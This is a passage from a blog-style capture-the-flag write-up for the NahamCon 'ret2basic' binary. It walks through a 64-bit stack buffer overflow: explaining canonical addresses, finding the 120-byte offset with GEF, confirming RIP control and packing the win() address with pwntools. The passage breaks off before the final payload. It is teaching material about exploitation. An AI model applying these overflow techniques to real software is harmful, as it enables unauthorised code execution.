  <li>In a 64-bit architecture, the entire 2â¶â´ bytes are not utilized for address space. In a typical 48 bit implementation, canonical address refers to one in the range 0x0000000000000000 to 0x00007FFFFFFFFFFF and 0xFFFF800000000000 to 0xFFFFFFFFFFFFFFFF. Any address outside this range is non-canonical.</li>
</ul>

<p><img src="/assets/img/Posts/ret2basic/can.png" alt="can" /></p>

<ul>
  <li>
    <p>In a 32-bit architecture, whenever a buffer is overflown, the register eip gets loaded with the overwritten â€œsaved return addressâ€ from stack but that is not the case with 64-bit architecture where the register rip must be loaded with a canonical address else it will never be loaded. Since 0x4141414141414141 (â€˜Aâ€™ = 0x41) doesnâ€™t fall in the required range, it never gets loaded in register rip</p>
  </li>
  <li>
    <p>So the program crashed as expected, but not because we overwrote RIP with an invalid address. In fact we donâ€™t control RIP at all. As mentioned in 1st point, maximum address size is 0x00007FFFFFFFFFFF. Weâ€™re overwriting RIP with a non-canonical address of 0x4141414141414141 which causes the processor to raise an exception. In order to control RIP, we need to overwrite it with 0x0000414141414141 instead.</p>
  </li>
</ul>

<h2 id="offset-hunt">Offset hunt</h2>

<p>So, now we need to find the correct offset !! To do so RBP and RSP should help us as we can see in above stack trace as they do get overwritten with Aâ€™s</p>

<p>To determine the exact location in the input buffer where the address to ret to should be, we can use a cycling buffer of 200 characters, weâ€™ll use in built <code class="language-plaintext highlighter-rouge">pattern create</code> from GEF</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>gefâ¤  pattern create 200
<span class="o">[</span>+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
<span class="o">[</span>+] Saved as <span class="s1">'$_gef1'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now weâ€™ll send this to the binary:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
</pre></td><td class="rouge-code"><pre>gefâ¤  r
Starting program: /root/Documents/nahamcon/binary/ret2basic
Can you overflow this?: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x7fffffffdcf0 <span class="o">(</span><span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
RBX: 0x0
RCX: 0x7ffff7f9e980 <span class="nt">--</span><span class="o">&gt;</span> 0xfbad208b
RDX: 0x0
RSI: 0x7ffff7f9ea03 <span class="nt">--</span><span class="o">&gt;</span> 0xfa1680000000000a
RDI: 0x7ffff7fa1680 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x616161616161616f <span class="o">(</span><span class="s1">'oaaaaaaa'</span><span class="o">)</span>
RSP: 0x7fffffffdd68 <span class="o">(</span><span class="s2">"paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
RIP: 0x40133b <span class="o">(</span>&lt;vuln+44&gt;:       ret<span class="o">)</span>
R8 : 0x7fffffffdcf0 <span class="o">(</span><span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
R9 : 0x0
R10: 0xfffffffffffff24a
R11: 0x246
R12: 0x401100 <span class="o">(</span>&lt;_start&gt;:        endbr64<span class="o">)</span>
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x401334 &lt;vuln+37&gt;:  call   0x4010b0 &lt;gets@plt&gt;
   0x401339 &lt;vuln+42&gt;:  nop
   0x40133a &lt;vuln+43&gt;:  leave
<span class="o">=&gt;</span> 0x40133b &lt;vuln+44&gt;:  ret
   0x40133c &lt;main&gt;:     push   rbp
   0x40133d &lt;main+1&gt;:   mov    rbp,rsp
   0x401340 &lt;main+4&gt;:   mov    eax,0x0
   0x401345 &lt;main+9&gt;:   call   0x40130f &lt;vuln&gt;
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7fffffffdd68 <span class="o">(</span><span class="s2">"paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
0008| 0x7fffffffdd70 <span class="o">(</span><span class="s2">"qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
0016| 0x7fffffffdd78 <span class="o">(</span><span class="s2">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
0024| 0x7fffffffdd80 <span class="o">(</span><span class="s2">"saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
0032| 0x7fffffffdd88 <span class="o">(</span><span class="s2">"taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
0040| 0x7fffffffdd90 <span class="o">(</span><span class="s2">"uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
0048| 0x7fffffffdd98 <span class="o">(</span><span class="s2">"vaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
0056| 0x7fffffffdda0 <span class="o">(</span><span class="s2">"waaaaaaaxaaaaaaayaaaaaaa"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040133b <span class="k">in </span>vuln <span class="o">()</span>
<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
<span class="nv">$rax</span>   : 0x00007fffffffdcf0  â†’  <span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span>
<span class="nv">$rbx</span>   : 0x0
<span class="nv">$rcx</span>   : 0x00007ffff7f9e980  â†’  0x00000000fbad208b
<span class="nv">$rdx</span>   : 0x0
<span class="nv">$rsp</span>   : 0x00007fffffffdd68  â†’  <span class="s2">"paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"</span>
<span class="nv">$rbp</span>   : 0x616161616161616f <span class="o">(</span><span class="s2">"oaaaaaaa"</span>?<span class="o">)</span>
<span class="nv">$rsi</span>   : 0x00007ffff7f9ea03  â†’  0xfa1680000000000a
<span class="nv">$rdi</span>   : 0x00007ffff7fa1680  â†’  0x0000000000000000
<span class="nv">$rip</span>   : 0x000000000040133b  â†’  &lt;vuln+44&gt; ret
<span class="nv">$r8</span>    : 0x00007fffffffdcf0  â†’  <span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span>
<span class="nv">$r9</span>    : 0x0
<span class="nv">$r10</span>   : 0xfffffffffffff24a
<span class="nv">$r11</span>   : 0x246
<span class="nv">$r12</span>   : 0x0000000000401100  â†’  &lt;_start+0&gt; endbr64
<span class="nv">$r13</span>   : 0x0
<span class="nv">$r14</span>   : 0x0
<span class="nv">$r15</span>   : 0x0
<span class="nv">$eflags</span>: <span class="o">[</span>zero carry parity adjust sign <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
<span class="nv">$cs</span>: 0x0033 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x0000 <span class="nv">$es</span>: 0x0000 <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0000
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€
0x00007fffffffdd68â”‚+0x0000: <span class="s2">"paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"</span>    â† <span class="nv">$rsp</span>
0x00007fffffffdd70â”‚+0x0008: <span class="s2">"qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]"</span>
0x00007fffffffdd78â”‚+0x0010: <span class="s2">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"</span>
0x00007fffffffdd80â”‚+0x0018: <span class="s2">"saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"</span>
0x00007fffffffdd88â”‚+0x0020: <span class="s2">"taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span>
0x00007fffffffdd90â”‚+0x0028: <span class="s2">"uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span>
0x00007fffffffdd98â”‚+0x0030: <span class="s2">"vaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"</span>
0x00007fffffffdda0â”‚+0x0038: <span class="s2">"waaaaaaaxaaaaaaayaaaaaaa"</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
     0x401334 &lt;vuln+37&gt;        call   0x4010b0 &lt;gets@plt&gt;
     0x401339 &lt;vuln+42&gt;        nop
     0x40133a &lt;vuln+43&gt;        leave
 â†’   0x40133b &lt;vuln+44&gt;        ret
<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
<span class="o">[</span><span class="c">#0] Id 1, Name: "ret2basic", stopped 0x40133b in vuln (), reason: SIGSEGV</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
<span class="o">[</span><span class="c">#0] 0x40133b â†’ vuln()</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
gefâ¤
</pre></td></tr></tbody></table></code></pre></div></div>

<p>As we can see both RSP and RBP are filled with our pattern, letâ€™s make use <code class="language-plaintext highlighter-rouge">pattern search</code> utility from GEF</p>

<p>Examining RSP:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>gefâ¤  pattern search <span class="nv">$rsp</span>
<span class="o">[</span>+] Searching <span class="s1">'$rsp'</span>
<span class="o">[</span>+] Found at offset 120 <span class="o">(</span>little-endian search<span class="o">)</span> likely
<span class="o">[</span>+] Found at offset 113 <span class="o">(</span>big-endian search<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So RIP is at offset 120.</p>

<p>Letâ€™s confirm the same by sending 120 Aâ€™s + 6 Bâ€™s which should cause RIP to be overwritten as 0x0000424242424242 and by doing so we are loading RIP register with a canonical address.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ python3 <span class="nt">-c</span> <span class="s2">"print ('A'*120 + 'BBBBBB')"</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre></td><td class="rouge-code"><pre>gefâ¤  r
Starting program: /root/Documents/nahamcon/binary/ret2basic
Can you overflow this?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x7fffffffdcf0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 120 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"BBBBBB"</span><span class="o">)</span>
RBX: 0x0
RCX: 0x7ffff7f9e980 <span class="nt">--</span><span class="o">&gt;</span> 0xfbad208b
RDX: 0x0
RSI: 0x7ffff7f9ea03 <span class="nt">--</span><span class="o">&gt;</span> 0xfa1680000000000a
RDI: 0x7ffff7fa1680 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x4141414141414141 <span class="o">(</span><span class="s1">'AAAAAAAA'</span><span class="o">)</span>
RSP: 0x7fffffffdd70 <span class="nt">--</span><span class="o">&gt;</span> 0x401360 <span class="o">(</span>&lt;__libc_csu_init&gt;:    endbr64<span class="o">)</span>
RIP: 0x424242424242 <span class="o">(</span><span class="s1">'BBBBBB'</span><span class="o">)</span>
R8 : 0x7fffffffdcf0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 120 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"BBBBBB"</span><span class="o">)</span>
R9 : 0x0
R10: 0xfffffffffffff24a
R11: 0x246
R12: 0x401100 <span class="o">(</span>&lt;_start&gt;:        endbr64<span class="o">)</span>
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x424242424242
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7fffffffdd70 <span class="nt">--</span><span class="o">&gt;</span> 0x401360 <span class="o">(</span>&lt;__libc_csu_init&gt;:   endbr64<span class="o">)</span>
0008| 0x7fffffffdd78 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7e06cca <span class="o">(</span>&lt;__libc_start_main+234&gt;:       mov    edi,eax<span class="o">)</span>
0016| 0x7fffffffdd80 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffde68 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffe219 <span class="o">(</span><span class="s2">"/root/Documents/nahamcon/binary/ret2basic"</span><span class="o">)</span>
0024| 0x7fffffffdd88 <span class="nt">--</span><span class="o">&gt;</span> 0x100000000
0032| 0x7fffffffdd90 <span class="nt">--</span><span class="o">&gt;</span> 0x40133c <span class="o">(</span>&lt;main&gt;:      push   rbp<span class="o">)</span>
0040| 0x7fffffffdd98 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7e067d9 <span class="o">(</span>&lt;init_cacheinfo+297&gt;:  mov    rbp,rax<span class="o">)</span>
0048| 0x7fffffffdda0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0056| 0x7fffffffdda8 <span class="nt">--</span><span class="o">&gt;</span> 0x96382d43e61f4924
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000424242424242 <span class="k">in</span> ?? <span class="o">()</span>
<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
<span class="nv">$rax</span>   : 0x00007fffffffdcf0  â†’  <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
<span class="nv">$rbx</span>   : 0x0
<span class="nv">$rcx</span>   : 0x00007ffff7f9e980  â†’  0x00000000fbad208b
<span class="nv">$rdx</span>   : 0x0
<span class="nv">$rsp</span>   : 0x00007fffffffdd70  â†’  0x0000000000401360  â†’  &lt;__libc_csu_init+0&gt; endbr64
<span class="nv">$rbp</span>   : 0x4141414141414141 <span class="o">(</span><span class="s2">"AAAAAAAA"</span>?<span class="o">)</span>
<span class="nv">$rsi</span>   : 0x00007ffff7f9ea03  â†’  0xfa1680000000000a
<span class="nv">$rdi</span>   : 0x00007ffff7fa1680  â†’  0x0000000000000000
<span class="nv">$rip</span>   : 0x424242424242
<span class="nv">$r8</span>    : 0x00007fffffffdcf0  â†’  <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
<span class="nv">$r9</span>    : 0x0
<span class="nv">$r10</span>   : 0xfffffffffffff24a
<span class="nv">$r11</span>   : 0x246
<span class="nv">$r12</span>   : 0x0000000000401100  â†’  &lt;_start+0&gt; endbr64
<span class="nv">$r13</span>   : 0x0
<span class="nv">$r14</span>   : 0x0
<span class="nv">$r15</span>   : 0x0
<span class="nv">$eflags</span>: <span class="o">[</span>zero carry parity adjust sign <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
<span class="nv">$cs</span>: 0x0033 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x0000 <span class="nv">$es</span>: 0x0000 <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0000
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€
0x00007fffffffdd70â”‚+0x0000: 0x0000000000401360  â†’  &lt;__libc_csu_init+0&gt; endbr64   â† <span class="nv">$rsp</span>
0x00007fffffffdd78â”‚+0x0008: 0x00007ffff7e06cca  â†’  &lt;__libc_start_main+234&gt; mov edi, eax
0x00007fffffffdd80â”‚+0x0010: 0x00007fffffffde68  â†’  0x00007fffffffe219  â†’  <span class="s2">"/root/Documents/nahamcon/binary/ret2basic"</span>
0x00007fffffffdd88â”‚+0x0018: 0x0000000100000000
0x00007fffffffdd90â”‚+0x0020: 0x000000000040133c  â†’  &lt;main+0&gt; push rbp
0x00007fffffffdd98â”‚+0x0028: 0x00007ffff7e067d9  â†’  &lt;init_cacheinfo+297&gt; mov rbp, rax
0x00007fffffffdda0â”‚+0x0030: 0x0000000000000000
0x00007fffffffdda8â”‚+0x0038: 0x96382d43e61f4924
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
<span class="o">[!]</span> Cannot access memory at address 0x424242424242
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
<span class="o">[</span><span class="c">#0] Id 1, Name: "ret2basic", stopped 0x424242424242 in ?? (), reason: SIGSEGV</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
gefâ¤  x <span class="nv">$rip</span>
0x424242424242: Cannot access memory at address 0x424242424242
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So we have successfully gained control over RIP and the offset is 120.</p>

<h2 id="exploitation">Exploitation</h2>

<p>As we know the binary does not have an executable stack, but we can replace the address at the right location so that the ret call redirects the program counter to <code class="language-plaintext highlighter-rouge">win()</code> which will result in reading <code class="language-plaintext highlighter-rouge">flag.txt</code></p>

<p>So now the last remaining piece of the puzzle is the address of <code class="language-plaintext highlighter-rouge">win</code> function.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>gefâ¤  p win
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x401215 &lt;win&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Letâ€™s test it out, first we will convert address <code class="language-plaintext highlighter-rouge">0x401215</code> in little endian format, we can do it using pwntools in python.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ python3
Python 3.8.6 <span class="o">(</span>default, Sep 25 2020, 09:36:53<span class="o">)</span>
<span class="o">[</span>GCC 10.2.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> from pwn import <span class="k">*</span>
<span class="o">&gt;&gt;&gt;</span> win <span class="o">=</span> p64<span class="o">(</span>0x401215<span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> win
b<span class="s1">'\x15\x12@\x00\x00\x00\x00\x00'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now letâ€™s send this address in one liner python:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
